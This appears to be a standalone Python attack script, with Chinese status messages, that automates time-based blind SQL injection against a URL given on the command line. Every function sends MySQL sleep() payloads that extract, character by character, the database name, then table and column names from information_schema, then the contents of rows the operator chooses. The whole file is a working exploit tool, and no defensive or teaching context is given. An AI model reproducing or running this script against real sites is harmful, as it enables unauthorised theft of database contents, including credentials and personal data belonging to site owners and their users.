#coding:utf-8
import requests
import time
import optparse

DBName=[]
DBTable=[]
DBColumn=[]
DATA=[]

def getDBName(url):
    DBNameLen=0
    payload="' and if (length(database())={0},sleep(3),0) %23"
    targetUrl=url+payload
    for DBNameLen in range(1,99):
        timeStart=time.time()
        res=requests.get(targetUrl.format(DBNameLen))
        timeEnd=time.time()
        if timeEnd-timeStart >=3:
            print('[*] 当前数据库长度',DBNameLen)
            break

    DBname=''
    for a in range(1,DBNameLen+1):
        for b in range(33,127):
            payload="' and if(ascii(substr(database(),{0},1))={1},sleep(3),0) %23"
            targetUrl=url+payload
            timeStart = time.time()
            res=requests.get(targetUrl.format(a,b))
            timeEnd = time.time()
            if timeEnd-timeStart >=3:
                DBname+=chr(b)
                print(DBname)
    DBName.append(DBname)

def getTables(url):
    print('[*] 开始获取当前数据库表的信息')
    payload="' and if((select count(table_name) from information_schema.tables where table_schema='{0}' )={1},sleep(3),0) %23"
    targetUrl=url+payload
    for tableCount in range(1,99):
        timeStart = time.time()
        res=requests.get(targetUrl.format(DBName[0],tableCount))
        timeEnd = time.time()
        if timeEnd-timeStart >=3:
            print('[*] 当前数据库表的数量是',tableCount)
            break

    DBtable=''
    payload2="' and if((select LENGTH(table_name) from information_schema.tables where table_schema='{0}' limit {1},1)={2},sleep(3),0) %23"
    targetUrl2=url+payload2
    for a in range(0,tableCount):
        for tableLen in range(1,99):
            timeStart = time.time()
            res2=requests.get(targetUrl2.format(DBName[0],a,tableLen))
            timeEnd = time.time()
            if timeEnd-timeStart >=3:
                print("[*] 当前第{0}个表的长度是{1}".format(a+1,tableLen))
                break
        print('[*] 开始获取第{0}表的信息'.format(a+1))
        payload3 = "' and if(ascii(substr((select table_name from information_schema.tables where table_schema='{0}' limit {1},1),{2},1))={3},sleep(3),0) %23"
        targetUrl3=url+payload3
        for b in range(1,tableLen+1):
            for c in range(33,127):
                timeStart = time.time()
                res3=requests.get(targetUrl3.format(DBName[0],a,b,c))
                timeEnd = time.time()
                if timeEnd-timeStart >= 3:
                    DBtable+=chr(c)
                    print(DBtable)
        DBTable.append(DBtable)
        print(DBTable)
        DBtable = ''

def getColumns(url,dbtable):
    print('[*] 开始获取当前数据库字段的信息')
    payload = "' and if((select count(column_name) from information_schema.columns where table_schema='{0}' and table_name='{1}')={2},sleep(3),0) %23"
    targetUrl=url+payload
    for columnCount in range(1,99):
        timeStart = time.time()
        res=requests.get(targetUrl.format(DBName[0],dbtable,columnCount))
        timeEnd = time.time()
        if timeEnd-timeStart >= 3:
            print('[*] 当前数据库的{0}表的字段数量是{1}'.format(dbtable,columnCount))
            break
    DBcolumn=''
    payload2="' and if((select LENGTH(column_name) from information_schema.columns where table_schema='{0}' and table_name='{1}' limit {2},1)={3},sleep(3),0) %23"
    targetUrl2=url+payload2
    for a in range(0,columnCount):
        for columnLen in range(1,99):
            timeStart = time.time()
            res2=requests.get(targetUrl2.format(DBName[0],dbtable,a,columnLen))
            timeEnd = time.time()
            if timeEnd-timeStart >=3:
                print("[*] 当前第{0}个字段的长度是{1}".format(a + 1, columnLen))
                break
        print('[*] 开始获取第{0}字段的信息'.format(a + 1))
        payload3="' and if(ascii(substr((select column_name from information_schema.columns where table_schema='{0}' and table_name='{1}' limit {2},1),{3},1))={4},sleep(3),0) %23"
        targetUrl3=url+payload3
        for b in range(1,columnLen+1):
            for c in range(33,127):
                timeStart = time.time()
                res3=requests.get(targetUrl3.format(DBName[0],dbtable,a,b,c))
                timeEnd = time.time()
                if timeEnd-timeStart >=3:
                    DBcolumn+=chr(c)
                    print(DBcolumn)
        DBColumn.append(DBcolumn)
        print(DBcolumn)
        DBcolumn=''

def getData(url,dbtable,dbcolumn):
    print('[*] 开始获取数据')
    payload="' and if((select count({0}) from {1})={2},sleep(3),0) %23"
    targetUrl=url+payload
    for dataCount in range(1,99):
        timeStart = time.time()
        res=requests.get(targetUrl.format(dbcolumn,dbtable,dataCount))
        timeEnd = time.time()
        if timeEnd-timeStart >=3:
            print('[*] 当前数据库的{0}表的字段{1}的数量是{2}'.format(dbtable,dbcolumn,dataCount))
            break
    data=''
    payload2="' and if((select length({0}) from {1} limit {2},1)={3},sleep(3),0) %23"
    targetUrl2=url+payload2
    for a in range(0,dataCount):
        for dataLen in range(1,99):
            timeStart = time.time()
            res2=requests.get(targetUrl2.format(dbcolumn,dbtable,a,dataLen))
            timeEnd = time.time()
            if timeEnd-timeStart >=3:
                print("[*] 当前第{0}个数据的长度是{1}".format(a + 1, dataLen))
                break
        print('[*] 开始获取第{0}个数据的信息'.format(a + 1))
        payload3="' and if (ascii(substr((select {0} from {1} limit {2},1),{3},1))={4},sleep(3),0) %23"
        targetUrl3=url+payload3
        for b in range(1,dataLen+1):
            for c in range(33,127):
                timeStart = time.time()
                res3=requests.get(targetUrl3.format(dbcolumn,dbtable,a,b,c))
                timeEnd = time.time()
                if timeEnd-timeStart >=3:
                    data+=chr(c)
                    print(data)
        DATA.append(data)
        print(DATA)
        data=''

def startSqli(url):
    print('[*] 开始获取当前数据库信息')
    getDBName(url)
    print('[*] 当前数据库名：',DBName[0])
    getTables(url)
    for item in range(0,len(DBTable)):
        print('第{0}个表是 {1}'.format(item+1,DBTable[item]))
    tableIndex=int(input('请输入你要查看的表的序列号：'))-1
    getColumns(url,DBTable[tableIndex])
    while True:
        for item in range(0, len(DBColumn)):
            print('第{0}个字段是 {1}'.format(item + 1, DBColumn[item]))
        columnIndex = int(input('请输入你要查看的字段数据的序列号：')) - 1
        getData(url,DBTable[tableIndex],DBColumn[columnIndex])

if __name__ == '__main__':
    parse=optparse.OptionParser()
    parse.add_option('-u',dest='url')
    options,args=parse.parse_args()
    startSqli(options.url)